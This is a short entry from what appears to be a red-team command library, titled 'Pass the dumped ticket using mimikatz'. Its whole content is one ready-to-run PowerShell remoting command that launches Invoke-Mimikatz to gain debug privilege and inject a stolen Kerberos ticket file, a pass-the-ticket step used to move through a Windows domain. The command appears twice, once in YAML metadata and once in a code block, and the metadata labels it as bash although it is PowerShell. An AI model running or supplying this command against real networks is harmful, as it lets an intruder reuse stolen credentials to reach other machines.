---
id: 22e38554-8a97-4bf7-90a3-1542bdd12a7d
name: Pass the dumped ticket using mimikatz
type: command
executor: bash
data: 'Invoke-Command -Session $sess -ScriptBlock { Invoke-Mimikatz -Command ''"privilege::debug"
  "kerberos::ptt ticket.kirbi" "exit"'' }

  '
output: null
created_at: '2020-07-15T19:05:44.362602+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Pass the dumped ticket using mimikatz

```bash
Invoke-Command -Session $sess -ScriptBlock { Invoke-Mimikatz -Command '"privilege::debug" "kerberos::ptt ticket.kirbi" "exit"' }

```


